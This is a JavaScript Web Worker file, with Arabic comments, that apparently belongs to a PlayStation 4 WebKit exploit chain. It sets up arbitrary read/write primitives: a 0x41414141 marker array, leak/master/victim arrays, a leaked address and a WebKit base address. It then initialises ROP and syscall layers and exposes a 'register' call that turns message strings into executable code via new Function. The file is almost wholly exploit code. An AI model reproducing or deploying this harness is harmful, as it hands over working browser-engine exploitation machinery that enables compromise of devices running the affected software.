"use strict";

// جلب ملف الحسابات المساعد بشكل آمن في بيئة العمل الخلفية
importScripts("misc.js");

let marker_arr = new Uint32Array(new ArrayBuffer(0x10));

// تهيئة المتغيرات الكونية لنطاق الـ Worker لمنع انهيار مفسر الجافا سكريبت
self.webkit_base = undefined;
self.constants = undefined;
self.arw = self.arw || {};

const api = {
  init(name) {
    self.name = name;

    if (typeof version !== "undefined" && typeof version.init === "function") {
      version.init();
    } else {
      throw new Error("version.init is not defined. check misc.js setup !!");
    }

    // جلب ملفات حزم الإصدارات والـ Userland الحيوية
    importScripts("ps4/constants.js", "ps4/userland.js");

    arw.master = new Uint32Array(6);

    marker_arr.fill(0x41414141);
    marker_arr.leak = arw.leak;
    marker_arr.master = arw.master;
    marker_arr.victim = arw.victim;

    return marker_arr;
  },

  setup(leak_addr, wk_base) {
    marker_arr = null;

    arw.leak_addr = new BInt(leak_addr);
    self.webkit_base = new BInt(wk_base);

    // استدعاء دوال الحقن والـ Syscalls وتهيئة الـ ROP الـ Native للبلايستيشن
    if (typeof init_arw === "function") init_arw();
    if (typeof init_rop === "function") init_rop();
    if (typeof init_syscalls === "function") init_syscalls();

    return true;
  },

  register(name, fn) {
    if (typeof fn !== "string") {
      throw new Error(fn + " not a string !!");
    }
    if (name in api) {
      throw new Error(name + " already registered !!");
    }
    api[name] = new Function("return (" + fn + ")")();
    return true;
  },

  ping() {
    return "pong";
  },
};

self.onmessage = function (e) {
  var id = e.data && e.data.id;
  var name = e.data && e.data.name;
  var args = (e.data && e.data.args) || [];

  try {
    var fn = api[name];
    if (typeof fn !== "function") {
      throw new Error("Unknown function " + name);
    }

    var ret = fn.apply(null, args);

    // تأمين نقل الحزم الثنائية المباشرة (Transferable ArrayBuffers) لضمان الخفة التامة
    if (name === "init" && ret && ret.buffer && ret.buffer instanceof ArrayBuffer) {
      self.postMessage({ id: id, type: "ret", value: ret }, [ret.buffer]);
    } else {
      self.postMessage({ id: id, type: "ret", value: ret });
    }
  } catch (err) {
    self.postMessage({
      id: id,
      type: "err",
      value: {
        message: err && err.message ? err.message : String(err),
        stack: err && err.stack ? err.stack : "",
      },
    });
  }
};
